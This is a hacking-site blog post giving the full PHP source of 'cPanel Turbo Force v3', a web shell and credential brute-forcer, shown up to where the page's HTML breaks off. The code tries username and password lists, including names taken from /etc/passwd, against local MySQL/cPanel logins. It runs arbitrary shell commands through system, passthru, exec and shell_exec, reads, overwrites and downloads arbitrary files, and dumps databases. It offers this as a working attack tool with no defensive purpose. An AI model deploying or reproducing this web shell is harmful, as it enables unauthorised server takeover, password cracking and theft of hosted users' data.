---
id: 231
title: cPanel Turbo Force v3
author: admin
layout: post
guid: http://hackingscripts.com/?p=231
permalink: /cpanel-turbo-force-v3/
categories:
  - PHP
tags:
  - PHP. cpanel
---
cPanel Turbo Force v3 &#8211; Coded By SaQEeR aL jNoOoB

## cPanel Turbo Force v3 Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;html&gt;

&lt;head&gt;
&lt;title&gt;cPanel Turbo Force v3&lt;/title&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
&lt;?php
/*
Turbo Force V3 By SaQEeR aL jNoOoB
*/
@set_time_limit(0);
@error_reporting(0);


echo '&lt;head&gt;

&lt;style type="text/css"&gt;
&lt;!--
body {
	background-color: #000000;
    font-size: 18px;
	color: #cccccc;
}
input,textarea,select{
font-weight: bold;
color: #cccccc;
dashed #ffffff;
border: 1px
solid #2C2C2C;
background-color: #080808
}
a {
	background-color: #151515;
	vertical-align: bottom;
	color: #000;
	text-decoration: none;
	font-size: 20px;
	margin: 8px;
	padding: 6px;
	border: thin solid #000;
}
a:hover {
	background-color: #080808;
	vertical-align: bottom;
	color: #333;
	text-decoration: none;
	font-size: 20px;
	margin: 8px;
	padding: 6px;
	border: thin solid #000;
}
.style1 {
	text-align: center;
}
.style2 {
	color: #FFFFFF;
	font-weight: bold;
}
.style3 {
	color: #FFFFFF;
}
--&gt;
&lt;/style&gt;

&lt;/head&gt;
';


function in($type,$name,$size,$value,$checked=0) 
 {
 $ret = "&lt;input type=".$type." name=".$name." "; if($size != 0) 
 {
 $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\""; if($checked) $ret .= " checked"; return $ret."&gt;"; }
 
class my_sql 
 {
 var $host = 'localhost'; var $port = ''; var $user = ''; var $pass = ''; var $base = ''; var $db = ''; var $connection; var $res; var $error; var $rows; var $columns; var $num_rows; var $num_fields; var $dump; function connect() 
 {
 switch($this-&gt;db) 
 {
 case 'MySQL': if(empty($this-&gt;port)) 
 {
 $this-&gt;port = '3306'; }
 if(!function_exists('mysql_connect')) return 0; $this-&gt;connection = @mysql_connect($this-&gt;host.':'.$this-&gt;port,$this-&gt;user,$this-&gt;pass); if(is_resource($this-&gt;connection)) return 1; $this-&gt;error = @mysql_errno()." : ".@mysql_error(); break; case 'MSSQL': if(empty($this-&gt;port)) 
 {
 $this-&gt;port = '1433'; }
 if(!function_exists('mssql_connect')) return 0; $this-&gt;connection = @mssql_connect($this-&gt;host.','.$this-&gt;port,$this-&gt;user,$this-&gt;pass); if($this-&gt;connection) return 1; $this-&gt;error = "Can't connect to server"; break; case 'PostgreSQL': if(empty($this-&gt;port)) 
 {
 $this-&gt;port = '5432'; }
 $str = "host='".$this-&gt;host."' port='".$this-&gt;port."' user='".$this-&gt;user."' password='".$this-&gt;pass."' dbname='".$this-&gt;base."'"; if(!function_exists('pg_connect')) return 0; $this-&gt;connection = @pg_connect($str); if(is_resource($this-&gt;connection)) return 1; $this-&gt;error = @pg_last_error($this-&gt;connection); break; case 'Oracle': if(!function_exists('ocilogon')) return 0; $this-&gt;connection = @ocilogon($this-&gt;user, $this-&gt;pass, $this-&gt;base); if(is_resource($this-&gt;connection)) return 1; $error = @ocierror(); $this-&gt;error=$error['message']; break; }
 return 0; }
 function select_db() 
 {
 switch($this-&gt;db) 
 {
 case 'MySQL': if(@mysql_select_db($this-&gt;base,$this-&gt;connection)) return 1; $this-&gt;error = @mysql_errno()." : ".@mysql_error(); break; case 'MSSQL': if(@mssql_select_db($this-&gt;base,$this-&gt;connection)) return 1; $this-&gt;error = "Can't select database"; break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; }
 return 0; }
 function query($query) 
 {
 $this-&gt;res=$this-&gt;error=''; switch($this-&gt;db) 
 {
 case 'MySQL': if(false===($this-&gt;res=@mysql_query('/*'.chr(0).'*/'.$query,$this-&gt;connection))) 
 {
 $this-&gt;error = @mysql_error($this-&gt;connection); return 0; }
 else if(is_resource($this-&gt;res)) 
 {
 return 1; }
 return 2; break; case 'MSSQL': if(false===($this-&gt;res=@mssql_query($query,$this-&gt;connection))) 
 {
 $this-&gt;error = 'Query error'; return 0; }
 else if(@mssql_num_rows($this-&gt;res) &gt; 0) 
 {
 return 1; }
 return 2; break; case 'PostgreSQL': if(false===($this-&gt;res=@pg_query($this-&gt;connection,$query))) 
 {
 $this-&gt;error = @pg_last_error($this-&gt;connection); return 0; }
 else if(@pg_num_rows($this-&gt;res) &gt; 0) 
 {
 return 1; }
 return 2; break; case 'Oracle': if(false===($this-&gt;res=@ociparse($this-&gt;connection,$query))) 
 {
 $this-&gt;error = 'Query parse error'; }
 else 
 {
 if(@ociexecute($this-&gt;res)) 
 {
 if(@ocirowcount($this-&gt;res) != 0) return 2; return 1; }
 $error = @ocierror(); $this-&gt;error=$error['message']; }
 break; }
 return 0; }
 function get_result() 
 {
 $this-&gt;rows=array(); $this-&gt;columns=array(); $this-&gt;num_rows=$this-&gt;num_fields=0; switch($this-&gt;db) 
 {
 case 'MySQL': $this-&gt;num_rows=@mysql_num_rows($this-&gt;res); $this-&gt;num_fields=@mysql_num_fields($this-&gt;res); while(false !== ($this-&gt;rows[] = @mysql_fetch_assoc($this-&gt;res))); @mysql_free_result($this-&gt;res); if($this-&gt;num_rows)
 {
$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
 break; case 'MSSQL': $this-&gt;num_rows=@mssql_num_rows($this-&gt;res); $this-&gt;num_fields=@mssql_num_fields($this-&gt;res); while(false !== ($this-&gt;rows[] = @mssql_fetch_assoc($this-&gt;res))); @mssql_free_result($this-&gt;res); if($this-&gt;num_rows)
 {
$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
; break; case 'PostgreSQL': $this-&gt;num_rows=@pg_num_rows($this-&gt;res); $this-&gt;num_fields=@pg_num_fields($this-&gt;res); while(false !== ($this-&gt;rows[] = @pg_fetch_assoc($this-&gt;res))); @pg_free_result($this-&gt;res); if($this-&gt;num_rows)
 {
$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
 break; case 'Oracle': $this-&gt;num_fields=@ocinumcols($this-&gt;res); while(false !== ($this-&gt;rows[] = @oci_fetch_assoc($this-&gt;res))) $this-&gt;num_rows++; @ocifreestatement($this-&gt;res); if($this-&gt;num_rows)
 {
$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
 break; }
 return 0; }
 function dump($table) 
 {
 if(empty($table)) return 0; $this-&gt;dump=array(); $this-&gt;dump[0] = '##'; $this-&gt;dump[1] = '## --------------------------------------- '; $this-&gt;dump[2] = '##  Created: '.date ("d/m/Y H:i:s"); $this-&gt;dump[3] = '## Database: '.$this-&gt;base; $this-&gt;dump[4] = '##    Table: '.$table; $this-&gt;dump[5] = '## --------------------------------------- '; switch($this-&gt;db) 
 {
 case 'MySQL': $this-&gt;dump[0] = '## MySQL dump'; if($this-&gt;query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this-&gt;get_result()) return 0; $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'].";"; $this-&gt;dump[] = '## --------------------------------------- '; if($this-&gt;query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
 {
 foreach($this-&gt;rows[$i] as $k=&gt;$v) 
 {
$this-&gt;rows[$i][$k] = @mysql_real_escape_string($v);}
 $this-&gt;dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this-&gt;columns).'`) VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');'; }
 break; case 'MSSQL': $this-&gt;dump[0] = '## MSSQL dump'; if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
 {
 foreach($this-&gt;rows[$i] as $k=&gt;$v) 
 {
$this-&gt;rows[$i][$k] = @addslashes($v);}
 $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');'; }
 break; case 'PostgreSQL': $this-&gt;dump[0] = '## PostgreSQL dump'; if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0; if(!$this-&gt;get_result()) return 0; for($i=0;$i&lt;$this-&gt;num_rows;$i++) 
 {
 foreach($this-&gt;rows[$i] as $k=&gt;$v) 
 {
$this-&gt;rows[$i][$k] = @addslashes($v);}
 $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');'; }
 break; case 'Oracle': $this-&gt;dump[0] = '## ORACLE dump'; $this-&gt;dump[] = '## under construction'; break; default: return 0; break; }
 return 1; }
 function close() 
 {
 switch($this-&gt;db) 
 {
 case 'MySQL': @mysql_close($this-&gt;connection); break; case 'MSSQL': @mssql_close($this-&gt;connection); break; case 'PostgreSQL': @pg_close($this-&gt;connection); break; case 'Oracle': @oci_close($this-&gt;connection); break; }
 }
 function affected_rows() 
 {
 switch($this-&gt;db) 
 {
 case 'MySQL': return @mysql_affected_rows($this-&gt;res); break; case 'MSSQL': return @mssql_affected_rows($this-&gt;res); break; case 'PostgreSQL': return @pg_affected_rows($this-&gt;res); break; case 'Oracle': return @ocirowcount($this-&gt;res); break; default: return 0; break; }
 }
 }
 if(!empty($_POST['cccc']) && $_POST['cccc']=="download_file" && !empty($_POST['d_name'])) 
 {
 if(!$file=@fopen($_POST['d_name'],"r")) 
 {
 err(1,$_POST['d_name']); $_POST['cccc']=""; }
 else 
 {
 @ob_clean(); $filename = @basename($_POST['d_name']); $filedump = @fread($file,@filesize($_POST['d_name'])); fclose($file); $content_encoding=$mime_type=''; compress($filename,$filedump,$_POST['compress']); if (!empty($content_encoding)) 
 {
 header('Content-Encoding: ' . $content_encoding); }
 header("Content-type: ".$mime_type); header("Content-disposition: attachment; filename=\"".$filename."\";"); echo $filedump; exit(); }
 }
 if(isset($_GET['phpinfo'])) 
 {
 echo @phpinfo(); echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die(); }
 if (!empty($_POST['cccc']) && $_POST['cccc']=="db_query") 
 {
 echo $head; $sql = new my_sql(); $sql-&gt;db = $_POST['db']; $sql-&gt;host = $_POST['db_server']; $sql-&gt;port = $_POST['db_port']; $sql-&gt;user = $_POST['mysql_l']; $sql-&gt;pass = $_POST['mysql_p']; $sql-&gt;base = $_POST['mysql_db']; $querys = @explode(';',$_POST['db_query']); echo '&lt;body bgcolor=#e4e0d8&gt;'; if(!$sql-&gt;connect()) echo "&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=red&gt;&lt;b&gt;".$sql-&gt;error."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; else 
 {
 if(!empty($sql-&gt;base)&&!$sql-&gt;select_db()) echo "&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=red&gt;&lt;b&gt;".$sql-&gt;error."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; else 
 {
 foreach($querys as $num=&gt;$query) 
 {
 if(strlen($query)&gt;5) 
 {
 echo "&lt;font face=Verdana size=-2 color=green&gt;&lt;b&gt;Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."&lt;/b&gt;&lt;/font&gt;&lt;br&gt;"; switch($sql-&gt;query($query)) 
 {
 case '0': echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;Error : &lt;b&gt;".$sql-&gt;error."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"; break; case '1': if($sql-&gt;get_result()) 
 {
 echo "&lt;table width=100%&gt;"; foreach($sql-&gt;columns as $k=&gt;$v) $sql-&gt;columns[$k] = htmlspecialchars($v,ENT_QUOTES); $keys = @implode("&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#800000&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&nbsp;", $sql-&gt;columns); echo "&lt;tr&gt;&lt;td bgcolor=#800000&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&nbsp;".$keys."&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;"; for($i=0;$i&lt;$sql-&gt;num_rows;$i++) 
 {
 foreach($sql-&gt;rows[$i] as $k=&gt;$v) $sql-&gt;rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES); $values = @implode("&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&nbsp;",$sql-&gt;rows[$i]); echo '&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&nbsp;'.$values.'&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;'; }
 echo "&lt;/table&gt;"; }
 break; case '2': $ar = $sql-&gt;affected_rows()?($sql-&gt;affected_rows()):('0'); echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;affected rows : &lt;b&gt;".$ar."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;"; break; }
 }
 }
 }
 }
 echo "&lt;br&gt;&lt;title&gt;Turbo Force By Tryag&lt;/title&gt;&lt;form name=form method=POST&gt;"; 
 echo in('hidden','db',0,$_POST['db']); echo in('hidden','db_server',0,$_POST['db_server']); echo in('hidden','db_port',0,$_POST['db_port']); echo in('hidden','mysql_l',0,$_POST['mysql_l']); echo in('hidden','mysql_p',0,$_POST['mysql_p']); echo in('hidden','mysql_db',0,$_POST['mysql_db']); echo in('hidden','cccc',0,'db_query'); 
 echo "&lt;div align=center&gt;"; echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;Base: &lt;/b&gt;&lt;input type=text name=mysql_db value=\"".$sql-&gt;base."\"&gt;&lt;/font&gt;&lt;br&gt;"; echo "&lt;textarea cols=65 rows=10 name=db_query&gt;".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."&lt;/textarea&gt;&lt;br&gt;&lt;input type=submit name=submit value=\" Run SQL query \"&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;"; echo "&lt;/form&gt;"; echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die(); }























function ccmmdd($ccmmdd2,$att)
{
global $ccmmdd2,$att;
echo '
&lt;table style="width: 100%" class="style1" dir="rtl"&gt;
	&lt;tr&gt;
		&lt;td class="style9"&gt;&lt;strong&gt;���� ������&lt;/strong&gt;&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td class="style13"&gt;
				&lt;form method="post"&gt;
					&lt;select name="att" dir="rtl" style="height: 109px" size="6"&gt;
';
if($_POST['att']==null)
{
echo '						&lt;option value="system" selected=""&gt;system&lt;/option&gt;';
}else{
echo "						&lt;option value='$_POST[att]' selected=''&gt;$_POST[att]&lt;/option&gt;
						&lt;option value=system&gt;system&lt;/option&gt;
";

						
}

echo '
						&lt;option value="passthru"&gt;passthru&lt;/option&gt;
						&lt;option value="exec"&gt;exec&lt;/option&gt;
						&lt;option value="shell_exec"&gt;shell_exec&lt;/option&gt;	
					&lt;/select&gt;
						&lt;input name="page" value="ccmmdd" type="hidden"&gt;&lt;br&gt;
						&lt;input dir="ltr" name="ccmmdd2" style="width: 173px" type="text" value="';if(!$_POST['ccmmdd2']){echo 'dir';}else{echo $_POST['ccmmdd2'];}echo '"&gt;&lt;br&gt;
						&lt;input type="submit" value="�����"&gt;
				&lt;/form&gt;
		
		&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td class="style13"&gt;
';

		if($_POST[att]=='system')
		{
echo '
					&lt;textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px"&gt;';
					system($_POST['ccmmdd2']);
echo '					&lt;/textarea&gt;';


		}

		if($_POST[att]=='passthru')
		{
echo '
					&lt;textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px"&gt;';
					passthru($_POST['ccmmdd2']);
echo '					&lt;/textarea&gt;';


		}

		



		if($_POST[att]=='exec')
		{

echo '					&lt;textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px"&gt;';
					exec($_POST['ccmmdd2'],$res);
				echo $res = join("\n",$res); 				
echo '					&lt;/textarea&gt;';


		}







		if($_POST[att]=='shell_exec')
		{

echo '					&lt;textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px"&gt;';
				echo	shell_exec($_POST['ccmmdd2']);
echo '					&lt;/textarea&gt;';


		}
echo '		
		&lt;/td&gt;
	&lt;/tr&gt;
&lt;/table&gt;
';

exit;
}

if($_POST['page']=='edit')
{

$code=@str_replace("\r\n","\n",$_POST['code']);
$code=@str_replace('\\','',$code);
$fp = fopen($pathclass, 'w');
fwrite($fp,"$code");
fclose($fp);
echo "&lt;center&gt;&lt;b&gt;OK Edit&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt;";
exit;
}	







	if($_POST['page']=='show')
	{
	$pathclass =$_POST['pathclass'];
echo '
&lt;form method="POST"&gt;
&lt;input type="hidden" name="page" value="edit"&gt;
';
	
	$sahacker = fopen($pathclass, "rb");
echo '&lt;center&gt;'.$pathclass.'&lt;br&gt;&lt;textarea dir="ltr" name="code" style="width: 845px; height: 404px"&gt;';	
$code = fread($sahacker, filesize($pathclass));
echo $code =htmlspecialchars($code);
echo '&lt;/textarea&gt;';	
	fclose($sahacker);
echo '
&lt;br&gt;&lt;input type="text" name="pathclass" value="'.$pathclass.'" style="width: 445px;"&gt;
&lt;br&gt;&lt;strong&gt;&lt;input type="submit" value="edit file"&gt;
&lt;/form&gt;
';
		exit;
	}




	if($_POST['page']=='ccmmdd')
	{
	echo ccmmdd($ccmmdd2,$att);
	exit;
	}
























if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i&lt;=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "SaQEeR~ username is ===&gt; (&lt;b&gt;&lt;font color=green&gt;$user&lt;/font&gt;&lt;/b&gt;) Password is ===&gt; (&lt;b&gt;&lt;font color=green&gt;$pass&lt;/font&gt;&lt;/b&gt;)&lt;br /&gt;";
                $ok++;
            }
         }
        }
    }
    echo "&lt;hr&gt;&lt;b&gt;You Found &lt;font color=green&gt;$ok&lt;/font&gt; Cpanel By SaQEeR aL jNoOoB Script Name&lt;/b&gt;";
    echo "&lt;center&gt;&lt;b&gt;&lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt;";
    exit;
}
}
?&gt;




&lt;/head&gt;




&lt;form method="POST" target="_blank"&gt;
	&lt;strong&gt;
&lt;input name="page" type="hidden" value="find"&gt;        				
    &lt;/strong&gt;
    &lt;table width="748" border="0" cellpadding="3" cellspacing="1" align="center"&gt;
    &lt;tr&gt;
        &lt;td valign="top" bgcolor="#151515" height="67"&gt;&lt;center&gt;&lt;strong&gt;&lt;img src="http://im26.gulfup.com/2012-05-07/1336413453971.png" /&gt;&lt;br&gt;
		&lt;/strong&gt;
		&lt;a href="mailto:h1h@hotmail.be" class="style2"&gt;&lt;strong&gt;Cpanel Brute By SaQEeR aL jNoOoB&lt;/strong&gt;&lt;/a&gt;&lt;/center&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;
    &lt;table width="109%" border="0" cellpadding="3" cellspacing="1" align="center"&gt;
    &lt;td valign="top" bgcolor="#151515" class="style2" style="width: 19%" height="310"&gt;
	&lt;strong&gt;&lt;font size="4"&gt;User :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5" height="310"&gt;&lt;strong&gt;&lt;textarea cols="40" rows="10" name="usernames"&gt;&lt;/textarea&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" class="style2" style="width: 19%" height="263"&gt;
	&lt;strong&gt;&lt;font size="4"&gt;Pass :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5" height="263"&gt;&lt;strong&gt;&lt;textarea cols="40" rows="10" name="passwords"&gt;&lt;/textarea&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" class="style2" style="width: 19%" height="28"&gt;
	&lt;strong&gt;&lt;font size="4"&gt;Type :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5" height="28"&gt;
    &lt;span class="style2"&gt;&lt;strong&gt;&lt;font size="4"&gt;Simple :&lt;/font&gt; &lt;/strong&gt; &lt;/span&gt;
	&lt;strong&gt;
	&lt;input type="radio" name="type" value="simple" checked="checked" class="style3"&gt;&lt;/strong&gt;
    &lt;font class="style2"&gt;&lt;strong&gt;&lt;font size="4"&gt;/etc/passwd :&lt;/font&gt; &lt;/strong&gt; &lt;/font&gt;
	&lt;strong&gt;
	&lt;input type="radio" name="type" value="passwd" class="style3"&gt;&lt;/strong&gt;&lt;span class="style3"&gt;&lt;strong&gt;
	&lt;/strong&gt;
	&lt;/span&gt;
    &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%" height="32"&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5" height="32"&gt;&lt;strong&gt;&lt;input type="submit" value="start"&gt;
    &lt;/strong&gt;
    &lt;/td&gt;
    &lt;tr&gt;
&lt;/form&gt;    
    
    &lt;td valign="top" colspan="6" height="26" bgcolor="#151515"&gt;
	&lt;p align="center"&gt;&lt;u&gt;&lt;b&gt;&lt;span id="result_box" class lang="en"&gt;
	&lt;span class="hps"&gt;&lt;font size="4"&gt;If you&lt;/font&gt;&lt;/span&gt;&lt;font size="4"&gt;
	&lt;span class="hps"&gt;want&lt;/span&gt; &lt;span class="hps"&gt;users to&lt;/span&gt;
	&lt;span class="hps"&gt;the server&lt;/span&gt; &lt;span class="hps"&gt;at the end of&lt;/span&gt;
	&lt;/font&gt;&lt;span class="hps"&gt;&lt;font size="4"&gt;script&lt;/font&gt;&lt;/span&gt;&lt;/span&gt;&lt;/b&gt;&lt;/u&gt;&lt;/td&gt;

&lt;form method="POST" target="_blank"&gt;
&lt;strong&gt;
&lt;input type="hidden" name="go" value="cmd_mysql"&gt;
    	&lt;/strong&gt;
    	&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" class="style1" colspan="6" height="29"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;CMD MYSQL&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    				&lt;/tr&gt;
    	&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%" height="29"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;user:&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" height="29" width="17%"&gt;&lt;strong&gt;&lt;input name="mysql_l" type="text"&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" height="29" width="10%"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;pass:&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" height="29" width="16%"&gt;&lt;strong&gt;&lt;input name="mysql_p" type="text"&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" height="29" width="12%"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;database:&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" height="29" width="20%"&gt;&lt;strong&gt;&lt;input name="mysql_db" type="text"&gt;&lt;/strong&gt;&lt;/td&gt;
    				&lt;/tr&gt;
					&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="height: 25px; width: 19%;"&gt;
	&lt;strong&gt;&lt;font size="4"&gt;cmd&lt;/font&gt;&lt;font size="4"&gt; :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5" style="height: 25px"&gt;
	&lt;strong&gt;
	&lt;textarea name="db_query" style="width: 353px; height: 89px"&gt;SHOW DATABASES;
SHOW TABLES user_vb ;
SELECT * FROM user;
SELECT version();
SELECT user();&lt;/textarea&gt;&lt;/strong&gt;&lt;/td&gt;
    	&lt;/tr&gt;
		&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;&lt;strong&gt;&lt;input type="submit" value="run"&gt;&lt;/strong&gt;&lt;/td&gt;
    	&lt;/tr&gt;
&lt;input name="db" value="MySQL" type="hidden"&gt;
&lt;input name="db_server" type="hidden" value="localhost"&gt;
&lt;input name="db_port" type="hidden" value="3306"&gt;
&lt;input name="cccc" type="hidden" value="db_query"&gt;
    	
&lt;/form&gt;    	
		&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="6"&gt;&nbsp;&lt;/td&gt;


		&lt;/tr&gt;
		
&lt;form method="POST" target="_blank"&gt;
		&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" class="style1" colspan="6"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;CMD 
	system - passthru - exec - shell_exec&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    				&lt;/tr&gt;
		&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;cmd :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
					&lt;select name="att" dir="rtl"  size="1"&gt;
&lt;?php
if($_POST['att']==null)
{
echo '						&lt;option value="system" selected=""&gt;system&lt;/option&gt;';
}else{
echo "						&lt;option value='$_POST[att]' selected=''&gt;$_POST[att]&lt;/option&gt;
						&lt;option value=system&gt;system&lt;/option&gt;
";

						
}
?&gt;

						&lt;option value="passthru"&gt;passthru&lt;/option&gt;
						&lt;option value="exec"&gt;exec&lt;/option&gt;
						&lt;option value="shell_exec"&gt;shell_exec&lt;/option&gt;
					&lt;/select&gt;    
    &lt;strong&gt;
&lt;input name="page" type="hidden" value="ccmmdd"&gt;    
	&lt;input name="ccmmdd2" type="text" style="width: 284px" value="ls -la"&gt;&lt;/strong&gt;&lt;/td&gt;
    	&lt;/tr&gt;
		&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;&lt;strong&gt;&lt;input type="submit" value="go"&gt;&lt;/strong&gt;&lt;/td&gt;
    	&lt;/tr&gt;
&lt;/form&gt;    	    	

&lt;form method="POST" target="_blank"&gt;

		&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" class="style1" colspan="6"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;Show 
	File And Edit&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    				&lt;/tr&gt;
		&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;Path :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
	&lt;strong&gt;
	&lt;input name="pathclass" type="text" style="width: 284px" value="&lt;?php echo realpath('')?&gt;"&gt;&lt;/strong&gt;&lt;/td&gt;
    	&lt;/tr&gt;
		&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;&lt;strong&gt;&lt;input type="submit" value="show"&gt;&lt;/strong&gt;&lt;/td&gt;
    				&lt;/tr&gt;
&lt;input name="page" type="hidden" value="show"&gt;        				
&lt;/form&gt;    				
					&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" class="style1" colspan="6"&gt;&lt;strong&gt;
	&lt;font size="4"&gt;Info 
	Security&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
    				&lt;/tr&gt;
    	&lt;tr&gt;
    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&lt;strong&gt;
